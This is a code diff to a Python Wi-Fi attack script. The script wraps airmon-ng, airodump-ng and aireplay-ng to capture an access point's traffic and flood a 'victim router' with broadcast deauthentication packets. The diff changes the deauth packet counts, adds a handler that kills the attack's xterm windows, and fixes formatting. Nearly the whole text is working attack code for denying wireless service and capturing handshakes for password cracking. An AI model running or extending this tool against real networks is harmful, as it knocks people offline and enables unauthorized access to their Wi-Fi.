@@ -13,6 +13,13 @@ global netInterfaceName
 
 def ctrl_c(signum, frame):
     get_colours("\n[!] Stopping attack...", "mangeta")
+    # Killing all the xterm process.
+    process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
+    out, err = process1.communicate()
+    for line in out.splitlines():
+        if b'xterm' in line:
+            pid = int(line.split(None, 1)[0])
+            os.kill(pid, signal.SIGKILL)
     get_colours("\n\n[!] Clearing Temporary files..", "red")
     get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
     subprocess.run(["sudo", "airmon-ng", "stop", netInterfaceName], stdout=subprocess.DEVNULL)
@@ -66,7 +73,7 @@ def get_colours(text, color):
 
 def menu_panel():
     get_colours(f"[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + " -i <Network interface> "
-                                                                                              "-m <Attack mode>",
+                                                                                            "-m <Attack mode>",
                 "green")
     get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
     print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Network interface'}")
@@ -323,7 +330,7 @@ def attack_func(network_interface, attack_mode):
         os.system(
             f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface} &")
         time.sleep(6)
-        os.system(f"xterm -hold -e aireplay-ng -0 150 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
+        os.system(f"xterm -hold -e aireplay-ng -0 30 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
         time.sleep(2)
         subprocess.run(["clear"])
         script_banner()
@@ -415,7 +422,7 @@ def attack_func(network_interface, attack_mode):
         os.system(
             f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface} &")
         os.system(
-            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
+            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 400} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
         subprocess.run(["clear"])
         script_banner()
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
